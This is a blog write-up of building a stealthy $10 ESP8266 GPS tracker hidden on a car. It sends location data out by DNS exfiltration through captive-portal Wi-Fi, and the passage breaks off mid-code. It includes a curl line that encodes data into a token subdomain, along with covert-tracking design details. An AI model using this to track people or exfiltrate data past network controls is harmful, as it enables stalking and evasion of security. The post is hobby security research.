<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=/main.b9478d478cab804e9c38152e8f871e55017639e073e23c3482536d79ede530c1fe7dbcba6b751d74c13955ea8febea9c758b84c4395767f55cdf4397d70b067f.css integrity="sha512-uUeNR4yrgE6cOBUuj4ceVQF2OeBz4jw0glNtee3lMMH+fby6a3UddME5VeqP6+qcdYuExDlXZ/Vc30OX1wsGfw==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><link rel=stylesheet href=/style.css><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi - Alex Lynd</title><meta name=description content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><link rel=canonical href=/Stealthy-Drive-by-GPS-Tracker-ESP8266/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><meta property="og:description" content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><meta property="og:url" content="/Stealthy-Drive-by-GPS-Tracker-ESP8266/"><meta property="og:site_name" content="Alex Lynd"><meta property="article:published_time" content="2022-10-14T00:00:00-07:00"><meta property="article:modified_time" content="2023-01-13T02:14:47-07:00"><meta property="og:image" content="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@alexlynd"><meta name=twitter:creator content="@alexlynd"><meta name=twitter:title content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><meta name=twitter:description content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><meta name=twitter:image content="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld.png"><meta name=twitter:image:alt content="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"/#/schema/organization/1","name":"Doks","url":"/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"/#/schema/image/1","url":"/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"/#/schema/image/1"}},{"@type":"WebSite","@id":"/#/schema/website/1","url":"/","name":"Alex Lynd","description":"Alex Lynd is a cybersecurity content creator, hardware hacker, and open-source product developer.","publisher":{"@id":"/#/schema/organization/1"}},{"@type":"WebPage","@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/","url":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/","name":"Stealthy GPS Tracker \u0026 Drive-by Telemetry Using Open Wi-Fi","description":"Stealthy GPS Tracker \u0026 Drive-by Telemetry Using Open Wi-Fi","isPartOf":{"@id":"/#/schema/website/1"},"about":{"@id":"/#/schema/organization/1"},"datePublished":"2022-10-14T00:00:00CET","dateModified":"2023-01-13T02:14:47CET","breadcrumb":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["/Stealthy-Drive-by-GPS-Tracker-ESP8266/"]}]},{"@type":"BreadcrumbList","@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"/","url":"/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"/#/schema/article/1","headline":"Stealthy GPS Tracker \u0026 Drive-by Telemetry Using Open Wi-Fi","description":"Stealthy GPS Tracker \u0026 Drive-by Telemetry Using Open Wi-Fi","isPartOf":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/"},"mainEntityOfPage":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/"},"datePublished":"2022-10-14T00:00:00CET","dateModified":"2023-01-13T02:14:47CET","author":{"@id":"/#/schema/person/2"},"publisher":{"@id":"/#/schema/organization/1"},"image":{"@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"/Stealthy-Drive-by-GPS-Tracker-ESP8266/#/schema/image/2","url":"/me.png","contentUrl":"/me.png","caption":"Stealthy GPS Tracker \u0026 Drive-by Telemetry Using Open Wi-Fi"}]}]}</script><meta name=theme-color content="#fff"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest></head><body class="blog single"><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-lg-nowrap" aria-label="Main navigation"><a class="navbar-brand order-0" href=/ aria-label="Alex Lynd">Alex Lynd</a>
<button class="btn btn-menu order-2 d-block d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-lg-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-lg-none"></div><div class="offcanvas-header d-lg-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=/>Alex Lynd</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body p-4 p-lg-0"><ul class="nav flex-column flex-lg-row align-items-lg-center mt-2 mt-lg-0 ms-lg-2 me-lg-auto"><li class=nav-item><a class="nav-link ps-0 py-1 active" href=/blog/>Blog</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=/about/>About</a></li><li class=nav-item><a class="nav-link ps-0 py-1" href=/work/>Work</a></li></ul><hr class="text-black-50 my-4 d-lg-none"><form class="doks-search position-relative flex-grow-1 ms-lg-auto me-lg-2"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><hr class="text-black-50 my-4 d-lg-none"><ul class="nav flex-column flex-lg-row"><li class=nav-item><a class="nav-link social-link" href=https://github.com/AlexLynd><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-lg-none">GitHub</small></a></li><li class=nav-item><a class="nav-link social-link" href=https://twitter.com/AlexLynd><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg><small class="ms-2 d-lg-none">Twitter</small></a></li></ul><hr class="text-black-50 my-4 d-lg-none"><button id=mode class="btn btn-link" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></div></div></nav></header></div><div class="wrap container-xxl" role=document><div class=content><article><div class="row justify-content-center"><div class="col-md-12 col-lg-10"><div class=blog-header><h1>Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi</h1><p><small>Posted&nbsp;on&nbsp;October 14, 2022 by <a class="stretched-link position-relative" href=/contributors/alex-lynd/>Alex Lynd</a>&nbsp;&dash;&nbsp;<strong>10&nbsp;min read</strong></small><p></div></div><div class=col-md-13><div><figure class=figure><img class="figure-img img-fluid lazyload blur-up" data-sizes=auto src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_3312eb49bc91e3099e1659ca6f8e4040.png data-srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_99c6bd43f3534424eab9390f3a4efe65.png 900w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_714740e6f10b6c847dafa592225870b6.png 800w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_a99400cdb2926757a007ae3d7e40dd81.png 700w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_841921a35d199da2467f114aa8a33750.png 600w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_d8048a9ef7f9da2ebef5eb8f72aad4ea.png 500w" width=1270 height=715 alt="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"><noscript><img class="figure-img img-fluid" sizes=100vw srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_99c6bd43f3534424eab9390f3a4efe65.png 900w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_714740e6f10b6c847dafa592225870b6.png 800w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_a99400cdb2926757a007ae3d7e40dd81.png 700w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_841921a35d199da2467f114aa8a33750.png 600w,/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_d8048a9ef7f9da2ebef5eb8f72aad4ea.png 500w" src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/handheld_hu442cfc4f9bd1fe8c89a976020bb5d4b4_1555368_1270x715_fill_box_center_3.png width=1270 height=715 alt="Stealthy GPS Tracker & Drive-by Telemetry Using Open Wi-Fi"></noscript></figure></div></div><div class="col-md-12 col-lg-9"><hr><div class="alert alert-doks d-flex" role=alert><div class="flex-shrink-1 alert-icon">⚠️</div><div class=w-100>This project is still in progress! Check my blog and GitHub for the latest updates & upcoming documentation.</div></div><h2 id=low-cost-tracking-challenge>Low-Cost Tracking Challenge <a href=#low-cost-tracking-challenge class=anchor aria-hidden=true></a></h2><p>In a recent Hak5 episode, I took part in a challenge to track our elusive friend, Irish, and determine the various places he visited throughout the day.</p><p>Since low-cost hardware & disposable signals intelligence is a core part of my projects, I challenged myself to create a tracker in the smallest practical footprint, and designed a $10 device that uses <em>only</em> Wi-Fi to provide location updates once planted on Irish&rsquo;s car.</p><p>Using DNS Exfiltration, <a href=https://canarytokens.org>CanaryTokens</a>, an an ESP8266 with specialized low-power hardware, I created a motion activated tracker that could transmit intermittent location updates, by connecting to open Wi-Fi networks that Irish would drive past.</p><p><strong>In this post, I&rsquo;ll talk about the design process of DNS DriveBy: a $10 proof-of-concept & wardriving technique that uses open Wi-Fi networks to provide location data, Wi-Fi reconnaissance, and other telemetry.</strong></p><iframe width=100% height=340 src="https://www.youtube.com/embed/H0Nwff0KDJ0?start=151" title="YouTube video player" frameborder=0 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h6 id=resources>Resources <a href=#resources class=anchor aria-hidden=true></a></h6><ul><li><a href=https://github.com/alexlynd/DNS-DriveBy>Source Code: GitHub</a></li><li><a href=https://github.com/alexlynd/DNS-DriveBy>Enclosure 3D Files</a></li></ul><h2 id=mapping-wi-fi-devices-with-wardriving>Mapping Wi-Fi Devices with Wardriving <a href=#mapping-wi-fi-devices-with-wardriving class=anchor aria-hidden=true></a></h2><p>Wardriving is my favorite lazy reconnaissance technique, since I can aimlessly <a href=https://www.hackster.io/news/auditpi-portable-pi-setup-and-warskating-device-a152c2a0962f>skate around</a> and create an interactive map of vulnerable networks, IOT products, and various other devices in our wireless landscape.</p><p>I&rsquo;ve toyed with the idea of creating &ldquo;disposable wardriving payloads&rdquo; that I can slap on (my) car or a neighborhood cat (or anything that moves really), so I could get even lazier with collecting Wi-Fi intelligence - and created a <a href>$10 wardriving rig</a> using minimal components, making it accessible for anyone to replicate.</p><p>I&rsquo;ve used it to demonstrate how hackers can <a href="https://youtu.be/GbkMA_VKbu0?t=70">phish your company with a mail parcel</a>, and even <a href="https://www.youtube.com/watch?v=oWNIWHT8q1A">strapped it to a drone for warflying</a> - but one obvious limitation lies in its inability to provide real-time telemetry for tracking applications, since it only uses a Wi-Fi radio.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_390e4fc62d5f863feecda177f759c2c6.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_26e98f45f37476e518796c4a21b043ef.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_4a6f301e2b059e23328bca512f67622b.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_546563e63e6cb323522f3a628bf42059.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_e1bb8ae9e81274077faef6ad97bf40f9.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_1920x0_resize_q75_h2_box.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/wardriving-prototype_hu71d22902bf16a413ca9a296bfeed95e0_337960_1920x0_resize_q75_h2_box.webp alt="$10 ESP8266 GPS Tracker" title="$10 ESP8266 GPS Tracker" width=1920 height=1080></p><p>While I <em>could</em> connect a SIM card module, this adds additional hardware and a cost barrier to my design - and also makes it more easily traceable if discovered.</p><p><strong>So I wondered, would it be possible to use un-authenticated Wi-Fi from coffee shops or setup networks that it drives past to upload wardriving data & GPS coordinates intermittently?</strong></p><h2 id=bypass-captive-wi-fi-portals-with-dns>Bypass Captive Wi-Fi Portals with DNS <a href=#bypass-captive-wi-fi-portals-with-dns class=anchor aria-hidden=true></a></h2><p>The answer is yes, but obviously it wasn&rsquo;t as simple that - I found that most of the open networks I encountered had a captive portal that requires you to input an email address or some other nonsense before you can actually connect to the web.</p><p>However, my friend <a href="https://www.youtube.com/watch?v=H0Nwff0KDJ0">Kody</a> suggested I look into DNS requests to bypass the captive portal using a well-known technique called <a href=https://aristanetworks.force.com/AristaCommunity/s/article/DNS-Exfiltration-The-Light-at-the-End-of-the-DNS-Tunnel>DNS Exfiltration</a>, which allows hackers to sneak sensitive information out of a network by hiding data &ldquo;inside&rdquo; of a domain name instead of sending a typical web request.</p><p>This works by making a DNS request to a domain name like <code>alexlynd.com</code>, but prepending a subdomain like <code>&lt;password_here>.alexlynd.com</code> - so that way I can retrieve the password (or other sensitive information) on my server, by looking at the nameserver logs.</p><p>While this is typically used to bypass poorly-configured firewalls for data exfiltration, I can also take advantage of this technique to sneak our wardriving gps data <strong>into</strong> the network as well!</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_575636a0c574db6e507975fd4681edd3.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_0bc985367b056f178ca4262ed89d1a4c.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_95326578df976b4a92a28a86a004b693.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_d6be860132decdd14a526c0c596973ef.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_b858deabc66db3b6cc4d5f043d9f8767.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_1920x0_resize_q75_h2_box_3.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-exfil_hub4ffece6aee27ccdb3ea575b67e293ec_124979_1920x0_resize_q75_h2_box_3.webp alt="&amp;ldquo;DNS Exfiltration&amp;rdquo;" width=1920 height=1080></p><p>Thanks to poor ingress filtering, I discovered that most of my nearby open networks allowed me to resolve DNS requests without &ldquo;fully connecting&rdquo; through the captive portal!</p><h2 id=canarytokens-as-a-gps-database>CanaryTokens as a GPS Database <a href=#canarytokens-as-a-gps-database class=anchor aria-hidden=true></a></h2><p>Hosting my own web server & infrastructure for DNS Exfiltration would be a pain in the ass, but luckily <a href=https://https://canarytokens.org>CanaryTokens</a>, an awesome free honeypot solution, offers a <a href=https://canarytokens.org>DNS Token</a> service that makes it extremely simple to exfiltrate our data to an online dashboard!</p><p>To try this service out, I connected to my local coffee shop Wi-Fi from my laptop without entering my info into the captive portal, and used my phone to generate a DNS token, which gave me a unique url in the format <code>&lt;dns-token-here>.canarytokens.org</code>.</p><p>In order to exfiltrate data to this token, <a href=https://docs.canarytokens.org/guide/dns-token.html>CanaryTokens specifices</a> we prepend a random 2 digit number with <code>G</code>, and a base32 encoded subdomain - so I used an online converter to translate <code>meow123</code> to base 32: <code>NVSW65ZRGIZQ</code> and made a request to the following url with <a href>curl</a>:</p><pre><code>curl NVSW65ZRGIZQ.G69.&lt;dns-token-here&gt;.canarytokens.org
</code></pre><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-request_hub071e617f0259de9fb08714d336af153_110837_d7706f0d34e927c021ef1e839c10d1a1.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-request_hub071e617f0259de9fb08714d336af153_110837_ebbb7f221d30a5d977997e9d9f93e86f.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-request_hub071e617f0259de9fb08714d336af153_110837_956x0_resize_q75_h2_box_3.webp 956w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-request_hub071e617f0259de9fb08714d336af153_110837_956x0_resize_q75_h2_box_3.webp alt="DNS request created by cURL to CanaryTokens" width=956 height=538></p><p>It worked! The last step was to create the hardware to log & convert GPS coordinates into base32 encoded strings, and automatically push that data through nearby open Wi-Fi networks.</p><h2 id=esp8266-wardriving-rig-for-10>ESP8266 Wardriving Rig for $10 <a href=#esp8266-wardriving-rig-for-10 class=anchor aria-hidden=true></a></h2><p>I didn&rsquo;t have a lot of time to iterate before deploying this project on Irish, so I tried my best to create a rugged prototype in the smallest possible form-factor using on-hand components. Here&rsquo;s how it was done.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_37487f0be067bb248c69d26a12a86ed6.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_ec1a06b5db04e0ced784e4763e5fb113.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_1838b22e8d722f437f2a1213159673bd.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_9b403304c9cafc6ba7039bfb60714d58.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_e2db59ba241f837d021ce451847695ce.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_1920x0_resize_q75_h2_box_3.webp 1920w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/planting-dimensions_hubba805eda8f8776f17a01e854b527e9f_1488771_1920x0_resize_q75_h2_box_3.webp alt="DNS DriveBy tracker being placed on Irish&amp;rsquo;s car" width=1920 height=1080></p><div class="alert alert-doks d-flex" role=alert><div class="flex-shrink-1 alert-icon">⚠️</div><div class=w-100><b>Full assembly guide and DIY kit coming soon.</b></div></div><h4 id=breadboarding>Breadboarding <a href=#breadboarding class=anchor aria-hidden=true></a></h4><p>The <a href=https://www.espressif.com/en/products/socs/esp8266>ESP8266</a> is my favorite low-cost Wi-Fi microcontroller for its attack & reconnaissance capabilities, and I chose the minimal <a href=https://www.microchip.ua/wireless/esp01.pdf>ESP-01</a> form-factor to keep my tracker footprint as small as possible.</p><p>Paired with a <a href=https://www.u-blox.com/en/product/neo-6-series>NEO-6M GPS module</a>, I started by creating a breadboard prototype to test how many coordinates could be logged to the ESP8266&rsquo;s internal memory.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_9ed519ce6488b027ca6fff3f5fc6f887.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_b81fe7ec7118cfe6d082ce2fea4515c1.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_35b0453930a664578b8bed40db05f5b4.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_f40182d2bba965467e99378923416a6e.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_0bfc9d895dd19b38d8956d54514dc12f.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_08910ae0e6ffceb0a1eb563d495847b6.webp 2048w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_2178x0_resize_q75_h2_box.webp 2178w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/dns-driveby-breadboard_hu5822a5f0d2b85e5e9e586807c96fbdae_799358_2178x0_resize_q75_h2_box.webp alt="DNS DriveBy breadboard prototype with ESP8266 and NEO-6M GPS" width=2178 height=1225></p><table><thead><tr><th>Essential Components</th><th>Notes</th><th>Cost</th></tr></thead><tbody><tr><td><a href=https://www.aliexpress.us/item/2251832396421378.html>Wi-Fi Microcontroller (ESP8266)</a></td><td>I use an ESP-01 module for this prototype, but any other ESP8266 will work. You will need a <a href>programmer</a> for it</td><td>$1</td></tr><tr><td><a href=https://www.aliexpress.us/item/3256804885465374.html>GPS Module (NEO-6M)</a></td><td>Cheap, easy to source UART GPS</td><td>$3</td></tr></tbody></table><h4 id=memory-management>Memory Management <a href=#memory-management class=anchor aria-hidden=true></a></h4><p>I found that storing the GPS coordinates quickly ate up heap space, causing overflows & crashes since the ESP8266 only has ~40KB of internal RAM - meaning I could only store around 625 GPS coordinate pairs (as floats).</p><p>To mitigate this, I implemented a <a href=https://www.geeksforgeeks.org/queue-data-structure/>queue</a> system that pushes coordinates to the internal 1MB Flash Memory with <a href=https://www.tutorialspoint.com/esp32_for_iot/esp32_for_iot_spiffs_storage.htm>SPIFFS</a> - which also allows me to retain data in case of a power loss or reset.</p><p><img class="img-fluid lazyload blur-up" srcset="/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_eddd505bf69371b0f9bfcf04856a9736.webp 480w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_3d8322ac142b48f76a12d57700dd3b8b.webp 720w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_91696205cad869baca66c111f3be50e2.webp 1080w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_6e47869609c9cca5c02d130731047bde.webp 1280w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_df2c0850e4acc832f40a6e61a6132d40.webp 1600w, /Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_2038x0_resize_q75_h2_box_3.webp 2038w" sizes=80vw src=/Stealthy-Drive-by-GPS-Tracker-ESP8266/img/memory_hu2b4e0e720643aaaea27636298c21e6d9_264269_2038x0_resize_q75_h2_box_3.webp alt="DNS DriveBy Internal Database" width=2038 height=1183></p><p>To optimize the amount of memory available and reduce flash wear, I set the GPS to poll coordinates every 15 seconds, and only keep 100 coordinates in RAM as 34 character base32 encoded char arrays. This allows me store around 15,600 coordinate pairs!</p><div class="alert alert-doks d-flex" role=alert><div class="flex-shrink-1 alert-icon">⚠️</div><div class=w-100>I might need to double check my math and algorithm.</div></div><h4 id=low-power-hardware>Low-Power Hardware <a href=#low-power-hardware class=anchor aria-hidden=true></a></h4><p>To keep the board powered for long enough to provide intel on Irish&rsquo;s whereabouts, implementing low-power hardware was necessary to conserve battery while his car was sitting idle. Luckily, the ESP8266 comes with a low-power mode that brings power consumption down to around <code>20μA</code>, which can be invoked with the following function:</p><pre><code>ESP.deepSleep(0);
